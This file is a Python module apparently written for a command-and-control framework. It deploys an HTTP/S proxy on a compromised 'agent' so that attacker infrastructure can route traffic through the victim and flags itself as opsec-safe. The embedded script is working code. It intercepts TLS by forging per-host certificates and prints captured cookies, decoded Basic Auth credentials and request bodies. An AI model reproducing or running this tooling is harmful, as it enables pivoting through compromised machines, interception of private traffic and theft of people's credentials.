from lib.common import helpers
class Module:
	def __init__(self, mainMenu, params=[]):
		# metadata info about the module, not modified during runtime
		self.info = {
			# name for the module that will appear in module menus
			'Name': 'HTTP/S Proxy',

			# list of one or more authors for the module
			'Author': ['@inaz2','Und3rf10w'],

			# more verbose multi-line description of the module
			'Description': ('Simple HTTP/S Proxy to foward connections from through agent'
							'from c2 infrastructure'),

			# True if the module needs to run in the background
			'Background': True,

			# if the module needs administrative privileges
			'NeedsAdmin': False,

			# File extension to save the file as
			'OutputExtension': None,

			# True if the method doesn't touch disk/is reasonably opsec safe
			'OpsecSafe': True,

			# list of any references/other comments
			'Comments': [
				'Modified code from:',
				'https://github.com/inaz2/proxy2'
			]
		}

		# any options needed by the module, settable during runtime
		self.options = {
			# format:
			#   value_name : {description, required, default_value}
			'Agent': {
				# The 'Agent' option is the only one that MUST be in a module
				'Description'   :   'Agent to run the proxy on.',
				'Required'      :   True,
				'Value'         :   ''
			},
			'Lport': {
				'Description'   :   'Port on c2 for the proxy to bind to',
				'Required'      :   True,
				'Value'         :   ''
			},
			'Rport': {
				'Description'   :   'Port on agent for the proxy to bind to',
				'Required'      :   True,
				'Value'         :   '3128'
			}
		}

		# save off a copy of the mainMenu object to access external functionality
		#   like listeners/agent handlers/etc.
		self.mainMenu = mainMenu

		# During instantiation, any settable option parameters
		#   are passed as an object set to the module and the
		#   options dictionary is automatically set. This is mostly
		#   in case options are passed on the command line
		if params:
			for param in params:
				# parameter format is [Name, Value]
				option, value = param
				if option in self.options:
					self.options[option]['Value'] = value

	def generate(self):

		# the Python script itself, with the command to invoke
		#   for execution appended to the end. Scripts should output
		#   everything to the pipeline for proper parsing.
		#
		# the script should be stripped of comments, with a link to any
		#   original reference script included in the comments.
		rport = self.options['Rport']['Value']
		script = """
		import sys
		import os
		import socket
		import ssl
		import select
		import httplib
		import urlparse
		import threading
		import gzip
		import zlib
		import time
		import json
		import re
		from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
		from SocketServer import ThreadingMixIn
		from cStringIO import StringIO
		from subprocess import Popen, PIPE
		from HTMLParser import HTMLParser

		class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
			address_family = socket.AF_INET6
			daemon_threads = True

			def handle_error(self, request, client_address):
				cls, e = sys.exc_info()[:2]
				if cls is socket.error or cls is ssl.SSLError:
					pass
				else:
					return HTTPServer.handle_error(self, request, client_address)


		class ProxyRequestHandler(BaseHTTPRequestHandler):
			cakey = 'ca.key'
			cacert = 'ca.crt'
			certkey = 'cert.key'
			certdir = 'certs/'
			timeout = 5
			lock = threading.Lock()

			def __init__(self, *args, **kwargs):
				self.tls = threading.local()
				self.tls.conns = {}

				BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

			def log_error(self, format, *args):
				if isinstance(args[0], socket.timeout):
					return

				self.log_message(format, *args)

			def do_CONNECT(self):
				if os.path.isfile(self.cakey) and os.path.isfile(self.cacert) and os.path.isfile(self.certkey) and os.path.isdir(self.certdir):
					self.connect_intercept()
				else:
					self.connect_relay()

			def connect_intercept(self):
				hostname = self.path.split(':')[0]
				certpath = "%%s/%%s.crt" %% (self.certdir.rstrip('/'), hostname)

				with self.lock:
					if not os.path.isfile(certpath):
						epoch = "%%d" %% (time.time() * 1000)
						p1 = Popen(["openssl", "req", "-new", "-key", self.certkey, "-subj", "/CN=%%s" %% hostname], stdout=PIPE)
						p2 = Popen(["openssl", "x509", "-req", "-days", "3650", "-CA", self.cacert, "-CAkey", self.cakey, "-set_serial", epoch, "-out", certpath], stdin=p1.stdout, stderr=PIPE)
						p2.communicate()

				self.wfile.write("%%s %%d %%s\\r\\n" %% (self.protocol_version, 200, 'Connection Established'))
				self.end_headers()

				self.connection = ssl.wrap_socket(self.connection, keyfile=self.certkey, certfile=certpath, server_side=True)
				self.rfile = self.connection.makefile("rb", self.rbufsize)
				self.wfile = self.connection.makefile("wb", self.wbufsize)

				conntype = self.headers.get('Proxy-Connection', '')
				if conntype.lower() == 'close':
					self.close_connection = 1
				elif (conntype.lower() == 'keep-alive' and self.protocol_version >= "HTTP/1.1"):
					self.close_connection = 0

			def connect_relay(self):
				address = self.path.split(':', 1)
				address[1] = int(address[1]) or 443
				try:
					s = socket.create_connection(address, timeout=self.timeout)
				except Exception as e:
					self.send_error(502)
					return
				self.send_response(200, 'Connection Established')
				self.end_headers()

				conns = [self.connection, s]
				self.close_connection = 0
				while not self.close_connection:
					rlist, wlist, xlist = select.select(conns, [], conns, self.timeout)
					if xlist or not rlist:
						break
					for r in rlist:
						other = conns[1] if r is conns[0] else conns[0]
						data = r.recv(8192)
						if not data:
							self.close_connection = 1
							break
						other.sendall(data)

			def do_GET(self):
				req = self
				content_length = int(req.headers.get('Content-Length', 0))
				req_body = self.rfile.read(content_length) if content_length else None

				if req.path[0] == '/':
					if isinstance(self.connection, ssl.SSLSocket):
						req.path = "https://%%s%%s" %% (req.headers['Host'], req.path)
					else:
						req.path = "http://%%s%%s" %% (req.headers['Host'], req.path)

				req_body_modified = self.request_handler(req, req_body)
				if req_body_modified is not None:
					req_body = req_body_modified
					req.headers['Content-length'] = str(len(req_body))

				u = urlparse.urlsplit(req.path)
				scheme, netloc, path = u.scheme, u.netloc, (u.path + '?' + u.query if u.query else u.path)
				assert scheme in ('http', 'https')
				if netloc:
					req.headers['Host'] = netloc
				req_headers = self.filter_headers(req.headers)

				try:
					origin = (scheme, netloc)
					if not origin in self.tls.conns:
						if scheme == 'https':
							self.tls.conns[origin] = httplib.HTTPSConnection(netloc, timeout=self.timeout)
						else:
							self.tls.conns[origin] = httplib.HTTPConnection(netloc, timeout=self.timeout)
					conn = self.tls.conns[origin]
					conn.request(self.command, path, req_body, dict(req_headers))
					res = conn.getresponse()
					res_body = res.read()
				except Exception as e:
					if origin in self.tls.conns:
						del self.tls.conns[origin]
					self.send_error(502)
					return

				version_table = {10: 'HTTP/1.0', 11: 'HTTP/1.1'}
				setattr(res, 'headers', res.msg)
				setattr(res, 'response_version', version_table[res.version])

				content_encoding = res.headers.get('Content-Encoding', 'identity')
				res_body_plain = self.decode_content_body(res_body, content_encoding)

				res_body_modified = self.response_handler(req, req_body, res, res_body_plain)
				if res_body_modified is not None:
					res_body_plain = res_body_modified
					res_body = self.encode_content_body(res_body_plain, content_encoding)
					res.headers['Content-Length'] = str(len(res_body))

				res_headers = self.filter_headers(res.headers)

				self.wfile.write("%%s %%d %%s\\r\\n" %% (self.protocol_version, res.status, res.reason))
				for line in res_headers.headers:
					self.wfile.write(line)
				self.end_headers()
				self.wfile.write(res_body)
				self.wfile.flush()

				with self.lock:
					self.save_handler(req, req_body, res, res_body_plain)

			do_HEAD = do_GET
			do_POST = do_GET
			do_OPTIONS = do_GET

			def filter_headers(self, headers):
				hop_by_hop = ('connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'transfer-encoding', 'upgrade')
				for k in hop_by_hop:
					del headers[k]
				return headers

			def encode_content_body(self, text, encoding):
				if encoding == 'identity':
					data = text
				elif encoding in ('gzip', 'x-gzip'):
					io = StringIO()
					with gzip.GzipFile(fileobj=io, mode='wb') as f:
						f.write(text)
					data = io.getvalue()
				elif encoding == 'deflate':
					data = zlib.compress(text)
				else:
					raise Exception("Unknown Content-Encoding: %%s" %% encoding)
				return data

			def decode_content_body(self, data, encoding):
				if encoding == 'identity':
					text = data
				elif encoding in ('gzip', 'x-gzip'):
					io = StringIO(data)
					with gzip.GzipFile(fileobj=io) as f:
						text = f.read()
				elif encoding == 'deflate':
					try:
						text = zlib.decompress(data)
					except zlib.error:
						text = zlib.decompress(data, -zlib.MAX_WBITS)
				else:
					raise Exception("Unknown Content-Encoding: %%s" %% encoding)
				return text

			def print_info(self, req, req_body, res, res_body):
				def parse_qsl(s):
					return '\\n'.join("%%-20s %%s" %% (k, v) for k, v in urlparse.parse_qsl(s, keep_blank_values=True))

				req_header_text = "%%s %%s %%s\\n%%s" %% (req.command, req.path, req.request_version, req.headers)
				res_header_text = "%%s %%d %%s\\n%%s" %% (res.response_version, res.status, res.reason, res.headers)

				print req_header_text

				u = urlparse.urlsplit(req.path)
				if u.query:
					query_text = parse_qsl(u.query)
					print ("==== QUERY PARAMETERS ====\\n%%s\\n" %% query_text)

				cookie = req.headers.get('Cookie', '')
				if cookie:
					cookie = parse_qsl(re.sub(r';\s*', '&', cookie))
					print ("==== COOKIE ====\\n%%s\\n" %% cookie)

				auth = req.headers.get('Authorization', '')
				if auth.lower().startswith('basic'):
					token = auth.split()[1].decode('base64')
					print ("==== BASIC AUTH ====\\n%%s\\n" %% token)

				if req_body is not None:
					req_body_text = None
					content_type = req.headers.get('Content-Type', '')

					if content_type.startswith('application/x-www-form-urlencoded'):
						req_body_text = parse_qsl(req_body)
					elif content_type.startswith('application/json'):
						try:
							json_obj = json.loads(req_body)
							json_str = json.dumps(json_obj, indent=2)
							if json_str.count('\\n') < 50:
								req_body_text = json_str
							else:
								lines = json_str.splitlines()
								req_body_text = "%%s\\n(%%d lines)" %% ('\\n'.join(lines[:50]), len(lines))
						except ValueError:
							req_body_text = req_body
					elif len(req_body) < 1024:
						req_body_text = req_body

					if req_body_text:
						print ("==== REQUEST BODY ====\\n%%s\\n" %% req_body_text)

				print ( res_header_text)

				cookies = res.headers.getheaders('Set-Cookie')
				if cookies:
					cookies = '\\n'.join(cookies)
					print ("==== SET-COOKIE ====\\n%%s\\n" %% cookies)

				if res_body is not None:
					res_body_text = None
					content_type = res.headers.get('Content-Type', '')

					if content_type.startswith('application/json'):
						try:
							json_obj = json.loads(res_body)
							json_str = json.dumps(json_obj, indent=2)
							if json_str.count('\\n') < 50:
								res_body_text = json_str
							else:
								lines = json_str.splitlines()
								res_body_text = "%%s\\n(%%d lines)" %% ('\\n'.join(lines[:50]), len(lines))
						except ValueError:
							res_body_text = res_body
					elif content_type.startswith('text/html'):
						m = re.search(r'<title[^>]*>\s*([^<]+?)\s*</title>', res_body, re.I)
						if m:
							h = HTMLParser()
							print ("==== HTML TITLE ====\\n%%s\\n" %% h.unescape(m.group(1).decode('utf-8')))
					elif content_type.startswith('text/') and len(res_body) < 1024:
						res_body_text = res_body

					if res_body_text:
						print ( "==== RESPONSE BODY ====\\n%%s\\n" %% res_body_text)

			def request_handler(self, req, req_body):
				pass

			def response_handler(self, req, req_body, res, res_body):
				pass

			def save_handler(self, req, req_body, res, res_body):
				self.print_info(req, req_body, res, res_body)

		class ThreadingHTTPSServer(ThreadingHTTPServer):
			address_family = socket.AF_INET6
			daemon_threads = True

			cakey = 'ca.key'
			cacert = 'ca.crt'

			def get_request(self):
				request, client_address = self.socket.accept()
				request = ssl.wrap_socket(request, keyfile=self.cakey, certfile=self.cacert, server_side=True)
				return request, client_address

			def handle_error(self, request, client_address):
				cls, e = sys.exc_info()[:2]
				if cls is socket.error or cls is ssl.SSLError:
					pass
				else:
					return HTTPServer.handle_error(self, request, client_address)

		def test(HandlerClass=ProxyRequestHandler, ServerClass=ThreadingHTTPSServer, protocol="HTTP/1.1"):
			port = %d
			server_address = ('', port)

			HandlerClass.protocol_version = protocol
			httpd = ServerClass(server_address, HandlerClass)

			sa = httpd.socket.getsockname()
			print "Serving HTTPS Proxy on", sa[0], "port", sa[1], "..."
			httpd.serve_forever()

		test()""" % int(rport)
		
		return script

